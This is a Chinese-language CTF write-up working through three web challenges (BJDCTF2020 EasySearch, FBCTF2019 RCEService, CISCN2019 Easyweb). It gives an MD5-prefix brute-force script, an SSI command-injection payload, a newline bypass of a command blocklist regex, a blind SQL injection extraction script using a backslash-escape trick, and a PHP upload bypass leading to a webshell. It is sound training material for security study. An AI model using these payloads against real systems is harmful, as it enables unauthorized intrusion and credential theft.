## [BJDCTF2020]EasySearch

扫出index.php.swp

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

admin已被赋值为6d0bc1，要我们得password，0到6位的md5值为6d0bc1.

脚本跑一下

```python
import hashlib
for i in range(1000000000):
    a = hashlib.md5(str(i).encode('utf-8')).hexdigest()
    if a[0:6] == '6d0bc1':
        print(i)
        print(a)
```

直接跑全数字的。

得到第一个2020666，

直接登录，但是发现没有任何东西，重新抓包发现端倪

发现了一个可疑的url

![image-20210904202955163](https://tcakalr.gitee.io/tc/image-20210904202955163.png)

访问一下

![image-20210904203114448](https://tcakalr.gitee.io/tc/image-20210904203114448.png)

看来username是一个可控的位置。

想起url的文件后缀，shtml

查找后应该是ssi注入，尝试一下

尝试执行命令

```
<!--#exec cmd="ls"-->
```

执行成功

![image-20210904203840165](https://tcakalr.gitee.io/tc/image-20210904203840165.png)

查根目录

![image-20210904203941950](https://tcakalr.gitee.io/tc/image-20210904203941950.png)

没有发现flag，可能在某个目录里。

![image-20210904204437935](https://tcakalr.gitee.io/tc/image-20210904204437935.png)

查找上一级目录找到flag

![image-20210904204532258](https://tcakalr.gitee.io/tc/image-20210904204532258.png)

直接cat读取。

## [FBCTF2019]RCEService

![image-20210904204821883](https://tcakalr.gitee.io/tc/image-20210904204821883.png)

打开是一个提交框，叫我们以json形式提交

json形式即是{"json":"json"},

叫我们输入命令

尝试ls

即{"cmd":"ls"}

![image-20210904205015762](https://tcakalr.gitee.io/tc/image-20210904205015762.png)

但是基本任何命令都被ban掉了，都无法执行

但是cat却可以执行，但返回为空。

![image-20210904212235966](https://tcakalr.gitee.io/tc/image-20210904212235966.png)

应该被正则匹配了，而cat不知道为什么无法执行。而且是未被过滤的。

那么正则的preg_match函数可以换行绕过

即写上%0a，最头尾填上%0a

![image-20210904205223605](https://tcakalr.gitee.io/tc/image-20210904205223605.png)

执行成功

![image-20210904205540190](https://tcakalr.gitee.io/tc/image-20210904205540190.png)

在/home/rceservice上发现flag

但是cat命令无法执行

读取jail

![image-20210904211358640](https://tcakalr.gitee.io/tc/image-20210904211358640.png)

发现了一个ls，联想只能执行ls，应该是环境配置的问题，给这个目录配置了ls

那是不是引用cat的绝对路径就可以执行命令呢

查一下cat在哪里，一般在/bin

ls一下

![image-20210904211624467](https://tcakalr.gitee.io/tc/image-20210904211624467.png)

发现cat，尝试利用

![image-20210904211917620](https://tcakalr.gitee.io/tc/image-20210904211917620.png)

成功读取

重新读取index.php查看

```php
';  } elseif  (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {    echo 'Hacking attempt detected

';  } else {    echo 'Attempting to run command:
';    $cmd = json_decode($json, true)['cmd'];    if ($cmd !== NULL) {      system($cmd);    } else {      echo 'Invalid input';    }    echo '

';  } } ?>     
```

上网查源码还有一段

```php
putenv('PATH=/home/rceservice/jail');
```

是一个配置环境的函数

所以猜测的没错，确实是只配置了ls的环境。所以只要引用绝对路径就可以执行cat命令了。

## [CISCN2019 总决赛 Day2 Web1]Easyweb

<img src="https://tcakalr.gitee.io/tc/image-20210908205339595.png" alt="image-20210908205339595" style="zoom:50%;" />

打开是一个登录界面阿，但是测试发现不是注入的地方

看源码，发现可疑的点

![image-20210908205455917](https://tcakalr.gitee.io/tc/image-20210908205455917.png)

发现有一个id值，猜测为sql注入点，但是测试无果，扫一下目录，发现robots.txt

查看

![image-20210908205634110](https://tcakalr.gitee.io/tc/image-20210908205634110.png)

有bak文件泄露

下载下来

image.php

```php
<?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```

发现了替换。

所以只要想办法让sql语句闭合就行了。

我们需要一个单引号使其转义，那么可以用\0,在经过addslashes函数就会变为\\\0,再替代后，就会变为\，那么就可以转义掉id后的单引号了，使id前的单引号和path的单引号闭合，再注释掉path的最后一个单引号，就可以插入我们的sql语句了。

脚本

```python
import  requests

url = "url/image.php?id=\\0&path="
payload = "or id=if(ascii(substr((select username from users),{0},1))>{1},1,0)%23"
result = ""
for i in range(1,100):
    l = 1
    r = 130
    mid = (l + r)>>1
    while(l<r):
        payloads = payload.format(i,mid)
        print(url+payloads)
        html = requests.get(url+payloads)
        if "JFIF" in html.text:
            l = mid +1
        else:
            r = mid
        mid = (l + r)>>1
    result+=chr(mid)
    print(result)
```

然后就是登录进入一个上传文件的地方

就只过滤了php而已，换成短标签，就可以了，再用蚁剑连上。